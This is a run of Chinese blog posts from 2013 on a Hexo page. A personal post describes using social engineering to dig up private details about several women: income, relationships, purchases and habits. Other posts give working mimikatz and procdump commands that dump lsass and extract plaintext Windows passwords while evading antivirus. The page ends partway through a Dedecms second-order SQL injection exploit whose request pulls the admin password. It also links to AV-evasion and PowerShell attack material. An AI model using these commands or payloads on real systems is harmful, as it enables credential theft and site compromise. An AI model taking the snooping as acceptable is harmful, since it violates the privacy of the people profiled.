        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2013/07/22/杂事/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2013/07/22/杂事/" itemprop="url">杂事</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2013-07-22T21:18:38+08:00">
                2013-07-22
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">in</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/琐碎杂事/" itemprop="url" rel="index">
                    <span itemprop="name">琐碎杂事</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>&nbsp; &nbsp; 很久没写博客了，很久不看除计算机类和课本以外的书了，很久没有出去玩过了，很久没有脱离电脑了！</p>
<p>很矛盾，很无聊。</p>
<p>&nbsp; &nbsp; 这几天xx了一些xx，社工了一些xx，人生百态，每一个人都是平凡人，她们也没有什么不同了，一样的喜怒哀乐，或许她们长得比较女神，仅此区别。</p>
<p>&nbsp; &nbsp; 从中提取两个人，他们有个共同点，都是美女。</p>
<p>&nbsp; &nbsp; 第一个，算一个二线女星吧，每月收入在25万到35万左右，出道时拍过很多很暴露且很诱惑的的写真来博取眼球，算成功了吧，各种人际关系，各种人情世故，各种接待应酬，各种时间安排，各种欺骗观众，可能你觉得这些对于一个在你心目中的女神来说是不可以出现的，但是其实她也就是一个比一般人长得好看一点的动物，都很正常，每个人无非都是在这个社会中争扎、夺取，只是方法不一样而已。再说她那男演员男朋友不敢恭维，上妆过后还是一个帅哥，卸妆过后就??????（各种吐槽10万字），年龄相差10岁，但名利可以拉近距离，可能这样说的比较直白。</p>
<p>&nbsp; &nbsp; 第二个，一个普通的人，兼职一些平面模特工作（淘女郎之类的），没有什么其他的了，什么恋爱、失恋和一般人一样，学校时代都很干净不在乎其它的，进入社会以后父母看法，工作地点，房子等等，到最后两个人的交流基本都是以前信用卡的账单怎么算。今天加了她的qq，直接被她拉黑了。汗！！！！</p>
<p>&nbsp; &nbsp; 其实她还是一个很优秀的人，学习不错，爱跳舞，写过小说，社会实践也很多，亚马逊的订单基本都是书，各种抄经，比较迷性与算命，呵呵！！</p>
<p>&nbsp; &nbsp; 还有几个，什么电影学院的学生，什么经纪人，什么摄影师????</p>
<p>&nbsp; &nbsp; 形形色色，没有其他的什么感情色彩看待他们的人生，我也只是看着，就像看一场话剧，只是演出的比较真实而已。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2013/06/09/mimikatz的一个新技巧/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2013/06/09/mimikatz的一个新技巧/" itemprop="url">mimikatz的一个新技巧</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2013-06-09T11:30:33+08:00">
                2013-06-09
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">in</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/技术文章/" itemprop="url" rel="index">
                    <span itemprop="name">技术文章</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>&nbsp; &nbsp; 刚看见一篇文章讲mimikatz的一个技巧，很多时候我们抓取明文的时候遇到杀毒软件，使得我的抓取失败。</p>
<p>&nbsp; &nbsp; 我<span style="line-height:1.5;">们先利用微软的一个工具</span><span style="color:#555555;font-size:14px;line-height:25.1875px;">procdump.exe <span style="color:#000000;font-size:12px;">有微软签名的东西，杀毒软件必须放过啊！</span></span></p>
<p><span style="color:#555555;font-size:14px;line-height:25.1875px;"><span style="color:#000000;font-size:12px;">&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></span><span style="color:#555555;font-size:14px;line-height:25.1875px;">C:    empprocdump.exe -accepteula -ma lsass.exe %COMPUTERNAME%_lsass.dmp</span></p>
<p><span style="color:#555555;font-size:14px;line-height:25.1875px;"><span style="font-size:12px;color:#000000;">&nbsp; &nbsp; copy dmp文件回本地然后再用mimikatz查看明文密码：</span></span><span style="color:#555555;font-size:14px;line-height:25.1875px;"></span></p>
<p></p>
<p><span style="color:#555555;font-size:14px;line-height:25.1875px;"><span style="font-size:12px;color:#000000;">&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;</span></span><span style="color:#555555;font-size:14px;line-height:25.1875px;">mimikatz # sekurlsa::minidump SUPERCOMPUTER_lsass.dmp</span></p>
<pre style="color:#555555;font-size:14px;line-height:25.1875px;">  &nbsp;&nbsp;&nbsp;&nbsp;mimikatz # sekurlsa::logonPasswords full</pre><pre style="color:#555555;font-size:14px;line-height:25.1875px;"> </pre>

<p>原文:<a href="http://www.room362.com/blog/2013/6/7/using-mimikatz-alpha-or-getting-clear-text-passwords-with-a.html" target="_blank" rel="noopener">http://www.room362.com/blog/2013/6/7/using-mimikatz-alpha-or-getting-clear-text-passwords-with-a.html</a></p>
<p>&nbsp; &nbsp; &nbsp; &nbsp;<a href="http://blog.gentilkiwi.com/securite/mimikatz/minidump" target="_blank" rel="noopener">http://blog.gentilkiwi.com/securite/mimikatz/minidump</a></p>
<p><span style="color:#555555;font-size:14px;line-height:25.1875px;"></span></p>
<p></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2013/06/07/emlog日志远程图片本地化插件sae版/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2013/06/07/emlog日志远程图片本地化插件sae版/" itemprop="url">emlog日志远程图片本地化插件sae版</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2013-06-07T19:10:58+08:00">
                2013-06-07
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">in</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/技术文章/" itemprop="url" rel="index">
                    <span itemprop="name">技术文章</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>&nbsp; &nbsp; 有时候觉得一篇文章不错，想要复制到自己博客记录下，但是各种图片很多，手动上传和下载太麻烦了，于是乎我百度了下emlog的插件，发现有一个，但是不是sae版的，于是移植了过来。</p>
<p>&nbsp;</p>
<p>思路：</p>
<p>&nbsp; &nbsp; 使用curl获取远程图片</p>
<p>&nbsp; &nbsp; 用storage的write函数写入</p>
<p>&nbsp;</p>
<p>代码:</p>
<p>&nbsp;</p>
<pre class="brush:php; toolbar: true; auto-links: true;">&lt;?php
/&#42
Plugin Name: 图片本地化
Version: 1.2
Plugin URL:http://www.qiyuuu.com/for-emlog/emlog-plugin-images-to-local
Description: 保存日志时将日志中的远程图片本地化
Author: 奇遇
Author Email: qiyuuu@gmail.com
Author URL: http://www.qiyuuu.com/
&#42/
function img2local($logid) {
    global $logData;
    $Log_Model = new Log_Model();
    $isImg2local = isset($_POST[’img2local’]) ? trim($_POST[’img2local’]) : ’’;
    if(!$isImg2local) {
        return;
    }
    $logData[’content’] = stripslashes($logData[’content’]);
    $logData[’excerpt’] = stripslashes($logData[’excerpt’]);
    $logData[’content’] = preg_replace_callback("/&lt;img([^&gt;]+)src="([^&gt;"]+)"?([^&gt;]&#42)&gt;/i","image2local",$logData[’content’]);
    $logData[’excerpt’] = preg_replace_callback("/&lt;img([^&gt;]+)src="([^&gt;"]+)"?([^&gt;]&#42)&gt;/i","image2local",$logData[’excerpt’]);
    $logData[’content’] = addslashes($logData[’content’]);
    $logData[’excerpt’] = addslashes($logData[’excerpt’]);
    $Log_Model-&gt;updateLog($logData,$logid);
}
addAction(’save_log’, ’img2local’);
function image2local($matches) //code by L.N.
{
    $url = parse_url($matches[2]);
    $host = ’lanu-upload.stor.sinaapp.com’;
    if(isset($url[’host’]) &amp;&amp; $url[’host’] != $host) {
        global $blogid;
        $imgName = md5(addslashes($matches[2]));
        $path = $url[’path’];
        if(!empty($url[’query’])) {
            $path .= ’?’ . $url[’query’];
        }

        $http_request = "GET $path HTTP/1.0
";
          $http_request .= "ACCEPT: &#42/&#42
";
          $http_request .= "ACCEPT-LANGUAGE: zh-cn
";
          $http_request .= "USER_AGENT: ".$_SERVER[’HTTP_USER_AGENT’]."
";
          $http_request .= "HOST: ".$url[’host’]."
";
          $http_request .= "CONNECTION: close

";
          $response = ’’;
        if(FALSE != ($fs = @fsockopen($url[’host’], empty($url[’port’]) ? 80 : $url[’port’], $errno, $errstr, 10))) {
            fwrite($fs, $http_request);
            while (!feof($fs)) {
                $response .= fgets($fs, 1160);
            }
            fclose($fs);
            $response = explode("

", $response, 2);
            preg_match("/Content-Type: (.&#42)
/i",$response[0],$imgType);
            $imgType = $imgType[1];
            $imgExt  = strtolower(substr(strrchr($matches[2], "."),1));
            if(empty($imgExt)) {
                if($imgType == ’image/pjpeg’ || $imgType == ’image/jpeg’) {
                    $imgExt = ’jpg’;
                } elseif ($imgType == ’image/x-png’ || $imgType == ’image/png’) {
                    $imgExt = ’png’;
                } elseif ($imgType == ’image/gif’) {
                    $imgExt = ’gif’;
                } elseif ($imgType == ’image/bmp’) {
                    $imgExt = ’bmp’;
                } else {
                    $imgExt = ’jpg’;
                }
            }
            $sea_imgName = $imgName.".".$imgExt;

            $sea_url = "http://".$url[’host’].$path;
            $s2 = new SaeStorage();
            $ch = curl_init();
            $user_agent = $_SERVER[’HTTP_USER_AGENT’];
            curl_setopt($ch,CURLOPT_URL,$sea_url);
            curl_setopt($ch,CURLOPT_HEADER,false);
            curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);     
            curl_setopt($ch,CURLOPT_USERAGENT,$user_agent);
            $temp=curl_exec($ch);
            if(empty($temp)){
                emMsg(’文件获取失败’,"javascript:history.go(-1);");
            }
            $sea_new_url = $s2-&gt;write(’upload’,date("Ym").’/’.$sea_imgName,$temp);
            if(empty($sea_new_url)){
                emMsg(’上传失败’,"javascript:history.go(-1);");
            }
        } else {
            return "&lt;img{$matches[1]}src="{$matches[2]}"{$matches[3]}&gt;";
        }
        return "&lt;img{$matches[1]}src="{$sea_new_url}"{$matches[3]}&gt;";
    } else {
        return "&lt;img{$matches[1]}src="{$matches[2]}"{$matches[3]}&gt;";
    }
}
function img2local_option()
{
?&gt;
&lt;input type="checkbox" value="1" name="img2local" checked="checked" /&gt;图片本地化
&lt;?php
}
addAction(’adm_writelog_head’, ’img2local_option’);</pre>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2013/06/07/【记录】Novell-Zenworks-MDM-Mobile-Device-Management-for-the-Masses/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2013/06/07/【记录】Novell-Zenworks-MDM-Mobile-Device-Management-for-the-Masses/" itemprop="url">【记录】Novell Zenworks MDM: Mobile Device Management for the Masses</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2013-06-07T14:13:00+08:00">
                2013-06-07
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">in</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/技术文章/" itemprop="url" rel="index">
                    <span itemprop="name">技术文章</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>笔记：一个本地包含+session缓存文件==“远程”文件包含</p>
<p><span style="line-height:1.5;">原文：</span><a href="http://console-cowboys.blogspot.ca/2013/06/novell-zenworks-mdm-mobile-device.html" target="_blank" rel="noopener">http://console-cowboys.blogspot.ca/2013/06/novell-zenworks-mdm-mobile-device.html</a></p>
<p>注意：需要翻墙！</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2013/06/05/hacking-with-powershell/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2013/06/05/hacking-with-powershell/" itemprop="url">hacking with powershell</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2013-06-05T15:22:11+08:00">
                2013-06-05
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">in</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/技术文章/" itemprop="url" rel="index">
                    <span itemprop="name">技术文章</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>&nbsp; &nbsp;&nbsp;<span style="font-family:arial, 宋体, sans-serif;font-size:14px;line-height:24px;text-indent:30px;">Windows PowerShell优秀和强大的东西，hacker们怎么使用他呢？</span></p>
<p></p>
<p><span style="font-family:arial, 宋体, sans-serif;font-size:14px;line-height:24px;text-indent:30px;">&nbsp;&nbsp;&nbsp;&nbsp;要考试继续写链接，考完看！</span></p>
<p><span style="font-family:’arial, 宋体, sans-serif’;"><span style="font-size:14px;line-height:24px;"><a href="http://labofapenetrationtester.blogspot.ca/2013/04/poshing-the-hashes.html" target="_blank" rel="noopener">http://labofapenetrationtester.blogspot.ca/2013/04/poshing-the-hashes.html</a></span></span></p>
<p><span style="font-family:’arial, 宋体, sans-serif’;"><span style="font-size:14px;line-height:24px;"><a href="http://labofapenetrationtester.blogspot.in/2013/05/poshing-hashes-part-2.html" target="_blank" rel="noopener">http://labofapenetrationtester.blogspot.in/2013/05/poshing-hashes-part-2.html</a></span></span></p>
<p><span style="font-family:’arial, 宋体, sans-serif’;"><span style="font-size:14px;line-height:24px;"><a href="http://www.youtube.com/watch?v=XpHgSHQZNpU" target="_blank" rel="noopener">http://www.youtube.com/watch?v=XpHgSHQZNpU</a></span></span></p>
<p><span style="font-family:’arial, 宋体, sans-serif’;"><span style="font-size:14px;line-height:24px;"></span></span></p>
<p></p>
<p><span style="font-family:’arial, 宋体, sans-serif’;"><span style="font-size:14px;line-height:24px;"><a href="http://clymb3r.wordpress.com/2013/04/06/reflective-dll-injection-with-powershell/" target="_blank" rel="noopener">http://clymb3r.wordpress.com/2013/04/06/reflective-dll-injection-with-powershell/</a></span></span></p>
<p><span style="font-family:’arial, 宋体, sans-serif’;"><span style="font-size:14px;line-height:24px;"></span></span></p>
<p></p>
<p><span style="font-family:’arial, 宋体, sans-serif’;"><span style="font-size:14px;line-height:24px;"><a href="http://pen-testing.sans.org/blog/2012/04/27/presentation-powershell-for-pen-testers" target="_blank" rel="noopener">http://pen-testing.sans.org/blog/2012/04/27/presentation-powershell-for-pen-testers</a></span></span></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2013/06/02/Veil一个生成免杀metepreter的工具/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2013/06/02/Veil一个生成免杀metepreter的工具/" itemprop="url">Veil一个生成免杀metepreter的工具</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2013-06-02T11:05:32+08:00">
                2013-06-02
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">in</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/技术文章/" itemprop="url" rel="index">
                    <span itemprop="name">技术文章</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>&nbsp; &nbsp; 今天看见非常优秀的工具，作为一个对逆向那块基本小白的我来说真是一个神器，傻瓜化的操作绕过主流杀毒软件！</p>
<p>&nbsp; &nbsp; &nbsp;<a href="https://www.christophertruncer.com/veil-a-payload-generator-to-bypass-antivirus/" target="_blank" rel="noopener">https://www.christophertruncer.com/veil-a-payload-generator-to-bypass-antivirus/</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2013/05/03/Dedecms-二次注入经典exp构造/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2013/05/03/Dedecms-二次注入经典exp构造/" itemprop="url">Dedecms 二次注入经典exp构造</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2013-05-03T22:59:35+08:00">
                2013-05-03
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">in</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/0day漏洞/" itemprop="url" rel="index">
                    <span itemprop="name">0day漏洞</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">0x01&nbsp;<span style="font-family:宋体;">前言</span></span><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;"><span style="font-family:宋体;"></span></span></p>
<p></p>
<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">Long&nbsp;long&nbsp;</span><span class="15" style="color:#000000;font-size:10pt;font-family:宋体;">ago,<a href="mailto:yy@safekeyer.com" target="_blank" rel="noopener">yy@safekeyer.com</a><span style="font-family:宋体;"><span style="color:#000000;">发现</span></span><span style="font-family:’Times New Roman’;"><span style="color:#000000;">dedecms</span></span><span style="font-family:宋体;"><span style="color:#000000;">二次注入的一个经典代码审计中二次攻击的案例，但限于字段大小不能超过</span></span><span style="font-family:’Times New Roman’;"><span style="color:#000000;">60</span></span><span style="font-family:宋体;"><span style="color:#000000;">字节而显得比较鸡肋，在</span></span><span style="font-family:’Times New Roman’;"><span style="color:#000000;">safekeyer</span></span><span style="font-family:宋体;"><span style="color:#000000;">集体的智慧之下发现两种突破办法。</span></span></span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&nbsp;&nbsp;&nbsp;此文重在<span style="font-family:’Times New Roman’;">exp</span><span style="font-family:宋体;">的构造，如需详细漏洞分析，请看：</span></span><span class="15" style="color:#0000ff;font-size:10pt;font-family:宋体;"><a href="http://www.wooyun.org/bugs/wooyun-2010-018562" target="_blank" rel="noopener">http://www.wooyun.org/bugs/wooyun-2010-018562</a></span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">0x02&nbsp;<span style="font-family:宋体;">方法一：直接缩短法</span></span><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="font-size:10.5pt;font-family:宋体;">理论：<span style="font-family:’Times New Roman’;">insert&nbsp;–&gt;&nbsp;select&nbsp;–&gt;insert&nbsp;–&gt;select&nbsp;</span></span><span style="font-size:10.5pt;font-family:宋体;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="font-size:10.5pt;font-family:宋体;">Exp:<span style="font-family:宋体;">（红色表示重点数据）</span></span><span style="font-size:10.5pt;font-family:宋体;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="font-size:10.5pt;font-family:宋体;">第一次<span style="font-family:’Times New Roman’;">insert</span></span><span style="font-size:10.5pt;font-family:宋体;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span class="15" style="color:#0000ff;font-size:10pt;font-family:宋体;"><a href="http://127.0.0.1/dede/plus/feedback.php" target="_blank" rel="noopener">http://127.0.0.1/dede/plus/feedback.php</a></span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">?action=send</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;color:#ff0000;font-size:10.5000pt;font-family:’宋体’;">&amp;comtype=comments</span><span style="mso-spacerun:’yes’;color:#ff0000;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&amp;aid=1</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&amp;isconfirm=yes</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&amp;cmtuser=admin</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&amp;msg=asfsafsdaf</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&amp;face=6</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;color:#ff0000;font-size:10.5000pt;font-family:’宋体’;">&amp;validate=slep</span><span style="mso-spacerun:’yes’;color:#ff0000;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;color:#ff0000;font-size:10.5000pt;font-family:’宋体’;">&amp;title=1’,”’”,1,3,4,5,6,7,8,(select&nbsp;pwd&nbsp;from&nbsp;%23@__admin))%23</span><span style="mso-spacerun:’yes’;color:#ff0000;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&amp;sbbt=%E5%8F%91%E9%80%81%E8%AF%84%E8%AE%BA</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
